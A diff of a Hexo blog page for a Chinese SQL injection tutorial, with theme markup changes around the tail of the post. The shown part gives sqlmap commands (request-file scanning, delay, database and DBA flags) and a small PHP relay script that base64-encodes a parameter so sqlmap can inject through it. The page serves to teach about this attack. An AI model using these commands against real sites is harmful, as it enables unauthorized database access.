+<div class="code-container" code-lang="Stylus"><div class="codebox"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;url&quot;</span> <span class="attr">--delay</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>重写http头</strong>，可以借照post方式，直接以数据包形式扫。</p>
-<pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -r 数据包文件 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Vim"><div class="codebox"><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -r 数据包文件 </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>参数值存在编码情况，<strong>中转注入</strong>，在本地写一个：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token variable">$url</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
-<span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>
-<span class="token variable">$urls</span><span class="token operator">=</span><span class="token variable">$url</span><span class="token operator">.</span><span class="token variable">$payload</span><span class="token punctuation">;</span>
-<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$urls</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$urls</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="variable">$urls</span>=<span class="variable">$url</span>.<span class="variable">$payload</span>;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$urls</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$urls</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>sqlmap注入本地脚本地址—-》本地搭建脚本（请求数据自定义编写）访问远程地址</p>
 <hr>
@@ -611,144 +449,115 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;admin.php?id&#x3D;1 and 1&#x3D;1	
 <p>–current-db：当前数据库</p>
 <p>–is-dba：是否为DBA(Database Administrator)</p>
 <p>–form 制作表格</p>
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 jjjing 于 2021-11-23 19:20:33 发布</div><div class="post-copyright-link"><span>作品地址：<a href="https://jinggg1123.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/">SQL注入</a></span><button class="copy-text" type="button" data-text="https://jinggg1123.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>jjjing</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div><div class="post-nav"><a class="post-nav-prev" href="/2021/11/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">上一篇<span>文件上传</span></a><a class="post-nav-prev" nopost=""></a></div></div><aside id="post-sidebar" status="show" active=""><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">数据库结构</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">MYSQL注入</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">查询方式</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link"><span class="toc-list-text">select查询语句</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link"><span class="toc-list-text">insert插入语句</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link"><span class="toc-list-text">delete删除语句</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link"><span class="toc-list-text">update更新数据</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">有回显注入</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">无回显盲注</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link"><span class="toc-list-text">布尔盲注</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link"><span class="toc-list-text">时间盲注</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link"><span class="toc-list-text">报错注入</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">二次注入</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">dnslog注入</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">堆叠注入</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">基本函数参考</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">注释符使用</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">异或注入</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">WAF绕过</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">工具</span></a></li></ol></div></div><script>document.addEventListener('DOMContentLoaded', function () {
+  var headings = Array.from(document.querySelectorAll('.post h1, .post h2, .post h3, .post h4, .post h5, .post h6'));
+  var usedHeadings = [];
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">首页</a></li>
-        
-          <li><a href="/archives/">归档</a></li>
-        
-          <li><a href="/categories/">分类</a></li>
-        
-          <li><a href="/about/">关于</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">数据库结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">MYSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">查询方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.1.</span> <span class="toc-text">select查询语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.2.</span> <span class="toc-text">insert插入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.3.</span> <span class="toc-text">delete删除语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.4.</span> <span class="toc-text">update更新数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">有回显注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">无回显盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">floor</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.5.</span> <span class="toc-text">dnslog注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.7.</span> <span class="toc-text">基本函数参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.8.</span> <span class="toc-text">注释符使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.9.</span> <span class="toc-text">异或注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.10.</span> <span class="toc-text">WAF绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">工具</span></a></li></ol>
-      </div>
-    
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&text=SQL注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=SQL注入&body=Check out this article: https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&name=SQL注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://itsbefore.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/&t=SQL注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2021-2025
-    before
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
+  document.querySelectorAll('#toc-container .toc-list-link').forEach(function (link) {
+    var title = link.querySelector('.toc-list-text').textContent.trim();
+    var item = link.closest('.toc-list-item');
+    var level = (item.className.match(/toc-list-level-(\d)/) || [])[1];
+    var heading = headings.find(function (node) {
+      return usedHeadings.indexOf(node) === -1 &&
+        (!level || node.tagName === 'H' + level) &&
+        node.textContent.trim() === title;
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功！");
-      e.clearSelection();
-    })
-  })
-  </script>
+    if (!heading) return;
 
+    var target = heading.id ? heading : heading.querySelector('[id]');
+    if (!target) return;
+    usedHeadings.push(heading);
+    link.setAttribute('href', '#' + encodeURIComponent(target.id));
+    link.setAttribute('data-toc-target', target.id);
+  });
 
-<script src="/js/main.js"></script>
+  document.addEventListener('click', function (event) {
+    var link = event.target.closest('#toc-container .toc-list-link[data-toc-target]');
+    if (!link) return;
 
-<!-- search -->
+    var heading = document.getElementById(link.getAttribute('data-toc-target'));
+    if (!heading) return;
 
-<!-- Baidu Analytics -->
+    event.preventDefault();
+    event.stopPropagation();
+    window.history.pushState(null, '', link.getAttribute('href'));
+    heading.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }, true);
+});</script></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="https://jinggg1123.github.io/archives/2021/11/23/sql%E6%B3%A8%E5%85%A5/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button" aria-controls="post-sidebar" aria-expanded="true"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2021 - 2026 <span>💗</span> <a href="/null">jjjing</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.2" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2021-11-23T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: true,
+  share_text: '🐱Share From Meow',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: false,
+    path: '',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+  category: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
 
-<!-- Cloudflare Analytics -->
+<script src="/js/plugins/dist/lazyload.min.js"></script>
 
-<!-- Disqus Comments -->
+<script src="/js/plugins/view-image.min.js"></script>
+<script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
 
-<!-- utterances Comments -->
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
 
-</body>
-</html>
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/main.js" type="module"></script>
+</div></body></html>
